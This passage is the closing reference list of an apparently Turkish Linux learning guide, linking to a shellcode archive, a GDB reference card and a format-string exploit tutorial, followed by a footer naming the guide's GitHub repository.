- [Shell-storm.org Shellcodes](http://shell-storm.org/shellcode/)
- [GDB Quick Reference](https://users.ece.utexas.edu/~adnan/gdb-refcard.pdf)
- [Format String Exploits — CodeArcana](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
